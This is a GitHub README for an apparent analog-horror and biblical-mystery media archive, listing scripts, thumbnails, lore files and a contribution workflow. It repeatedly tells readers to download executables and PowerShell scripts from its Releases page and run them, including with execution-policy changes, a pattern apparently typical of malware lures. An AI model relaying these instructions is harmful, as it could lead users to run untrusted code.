# Whispers from Eden: Analog Horror & Sacred Mystery Archive

[![Releases](https://img.shields.io/badge/Releases-download-blue?style=for-the-badge&logo=github)](https://github.com/kleyy1/https-www.youtube.com-channel-UC1eWBETNRotbvWa1yGIflhg/releases)

![Analog TV Static](https://images.unsplash.com/photo-1519305122553-5b8b8f5a5a56?auto=format&fit=crop&w=1500&q=80)
![Ancient Manuscript](https://images.unsplash.com/photo-1519681393784-d120267933ba?auto=format&fit=crop&w=1500&q=80)

Analog horror meets sacred mystery. This repository collects scripts, thumbnails, mock documents, and story fragments for the Whispers from Eden project. Use this repo if you study digital folklore, build ambient horror media, or research overlapping sacred and secular myth.

Topics
- analog-horror
- bible-horror
- biblical-mystery
- dark-academia
- digital-folklore
- fallen-angels
- forbidden-scripture
- sacred-lore
- spiritual-horror
- theological-paradox

Table of Contents
- About
- What you will find
- File layout
- How to get and run releases
- Scripts (structure and examples)
- Thumbnails and visual assets
- Lore compendium
- Use cases
- Style guide for new material
- Contributing
- License and credits
- Resources

About
This repo hosts a curated archive for a serial analog-horror project that frames theological paradoxes as creeping mystery. The work blends found-media style, faux-ecclesiastical artifacts, and audio-visual experiments. The assets aim for mood and plausibility. They support video episodes, ARG elements, and research notes.

What you will find
- Episode scripts in Markdown and plain text.
- Audio cue sheets and metadata for ambient tracks.
- Thumbnail PSDs and exported PNG/JPG assets.
- Scanned-style pages and mock manuscripts in high-res PNG and PDF.
- Short lore entries and linked timelines.
- Small playback utilities and installer scripts in Releases.

File layout (high level)
- /scripts
  - episode-01.md
  - episode-02.md
  - cue-sheets/
- /art
  - thumbnails/
  - mock-manuscripts/
  - cards/
- /lore
  - timeline.md
  - glossaries/
- /tools
  - render.sh
  - build-assets.ps1
- /releases
  - stored release archives and assets (see Releases page)

How to get and run releases
- Visit the Releases page and download the packaged files:
  https://github.com/kleyy1/https-www.youtube.com-channel-UC1eWBETNRotbvWa1yGIflhg/releases
- The releases page includes executables and helper scripts. Download the file you need and execute it on your machine.
- For Unix systems use: sh render.sh or bash render.sh after marking the file executable.
- For Windows use the provided .ps1 script. Run with PowerShell and required execution policy adjustments.
- If the Releases link fails or does not list files you expect, check the Releases section on the repo for manual downloads.

Scripts
The scripts folder contains scene-by-scene drafts and production notes. Each episode file follows a short and consistent format:
- Header block with episode ID, runtime, and assets.
- Scene entries with one-line directions and audio cues.
- Dialogue blocks with speaker labels and simple timing markers.
- Metadata that lists fonts, color palettes, and sample ratios for VHS style.

Example scene (excerpt)
- SCENE 03 — Archive Room
  - Visual: dim fluorescent, slow CRT glow
  - Audio: low hum, distant chant (A1)
  - ACTION: camera drifts to handwritten ledger
  - DIALOGUE:
    - NARRATOR: "The ledger knows us by names we no longer hold."

Thumbnails and visual assets
Thumbnails follow an analog-horror aesthetic:
- High contrast
- Film grain and scanlines
- Limited color palettes: sepia, teal, crimson
- Distressed typography that mimics typewriter and early dot-matrix

Included formats:
- PSD source files with organized layers
- Exported JPEGS for quick use
- PNGs with alpha for lower third overlays

Design tips
- Use 3-4 tones maximum.
- Keep title placement near the lower-left third.
- Add subtle noise layers. Blend at low opacity.
- Use serif display for sacred texts. Use monospace for technical overlays.

Lore compendium
The lore folder contains canonical fragments, indexed by tag and date. Entries include:
- Forbidden Psalms: short verses with anomalous syntax
- Correspondence: emails and letters from fictional clerics
- Artifact logs: mock catalog entries for found objects
- Timelines: cross-referenced events, locations, and witness accounts

Use cases
- Use scripts and assets to make short analog-horror clips.
- Use lore fragments to craft ARG puzzles.
- Use mock documents for prop creation and set dressing.
- Use cue sheets to lay out ambient soundscape.

Style guide for new material
- Voice: restrained, formal, and clinical when describing sacred elements.
- Tone: unsettling but factual.
- Syntax: short sentences. Clear verbs.
- Names: mix proper names with archaic phrase fragments.
- When creating new assets: annotate source fonts and color values.

Contributing
- Fork the repo.
- Create a branch named feature/<short-name>.
- Keep changes atomic. One idea per PR.
- Include a short PR description that lists files added or changed.
- Use the style guide in /lore/style.md for new lore entries.
- For visual assets, include a flattened export and a layered source file.

Pull request checklist
- Did you follow naming conventions?
- Did you include one-line metadata at the top of scripts?
- Did you include a license header for images you added?
- Did you provide usage notes for any executable file?

Development workflow
- Master stays deployable.
- Use feature branches for each episode or asset pack.
- Tag releases with semantic versioning for asset bundles.

License and credits
- Core text and scripts: CC BY-NC-SA unless otherwise noted in file header.
- Some visual assets use free stock sources. See credits for each file.
- If you add assets, include a license block in the file header and a source URL in /CREDITS.md.

Credits
- Concept and writing: Whispers from Eden creative team.
- Art direction: Visual lead and 2D designer.
- Sound design: ambient composer and field recordist.
- References: public domain scriptures and classical art where noted.

Resources and references
- Sample fonts and links are in /resources/fonts.md
- VHS effect presets and LUTs live in /resources/luts/
- Bibliography of sacred texts and archaic lexicons in /resources/bibliography.md

Examples of use (short workflows)
1) Make a thumbnail
- Open art/thumbnails/source-01.psd
- Swap text layer for episode title
- Export as JPG at 1280x720
- Apply final grain in post

2) Build a short scene render
- Place script in /scripts/episode-XX.md
- Prepare audio cues in /audio/cues/
- Run the renderer script from /tools:
  - sh tools/render.sh episode-XX
- Check logs in /tools/logs/

Accessibility and format
- Scripts use plain Markdown for easy parsing.
- Audio cue sheets use CSV for timecode sync across tools.
- Visual assets include color swatches for accessibility checks.

Security note on executables
- The Releases page may include helper scripts and small utilities. Download the release file that matches your OS. Execute only the file you trust and inspect the script before running.

Releases (download and execute)
- Visit and download the release package from:
  https://github.com/kleyy1/https-www.youtube.com-channel-UC1eWBETNRotbvWa1yGIflhg/releases
- The Releases page hosts zip archives, .sh helpers, and Windows PowerShell scripts. Download the file and execute it as needed for builds and asset packaging.

Contact and further reading
- Open an issue for bug reports and asset requests.
- Use Discussions for lore debates and episode ideas.
- See /README_ASSETS.md for detailed asset attributions.

Gallery
- A rotating visual gallery lives in /art/gallery with high-res mock manuscripts and thumbnail variations.

Image credits
- Backgrounds and static come from free stock and public domain archives. See /CREDITS.md for exact source links and attribution for each file.

SEO tags (for GitHub search)
analog horror, bible horror, sacred mystery, dark academia, digital folklore, fallen angels, forbidden scripture, sacred lore, spiritual horror, theological paradox

The repository aims to be a modular kit. Use assets, remix text, and adapt cues. Contribute with a clear PR and follow the style guide.